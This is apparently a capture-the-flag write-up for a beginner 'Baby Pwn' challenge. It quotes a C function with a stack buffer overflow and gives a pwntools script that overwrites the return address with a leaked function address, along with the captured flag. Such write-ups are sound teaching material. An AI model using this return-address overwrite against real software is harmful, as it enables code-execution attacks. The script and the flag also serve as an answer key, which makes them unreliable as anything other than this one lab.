https://ctftime.org/event/2570

# Baby Pwn (PWN)

Here's a baby pwn challenge for you to try out. Can you get the flag?

nc 34.162.142.123 5000

## Analysis

`main` leaks the absolute address of `secret` for us:

```c
printf("Address of secret: %p\n", secret);
```

`vulenrable_function` allows us to control the return address on the stack:

```c
void vulnerable_function()
{
    char buffer[64];
    printf("Enter some text: ");
    fgets(buffer, 128, stdin);
    printf("You entered: %s\n", buffer);
}
```

`secret` prints the flag:

```c
void secret()
{
    printf("Congratulations! Here is your flag: ");
    char *argv[] = {"/bin/cat", "flag.txt", NULL};
    char *envp[] = {NULL};
    execve("/bin/cat", argv, envp);
}
```

## Solution

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./baby-pwn", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.162.142.123", 5000)

p.readuntil(b"secret: ")
elf.sym["secret"] = int(p.readline().decode(), 16)

payload = b"A" * 0x48
payload += p64(elf.sym["secret"])
p.sendlineafter(b"Enter some text: ", payload)

p.readuntil(b"flag: ")
log.success(p.readline().decode())
# uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}
```

## Flag
`uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}`

smiley 2025/01/12
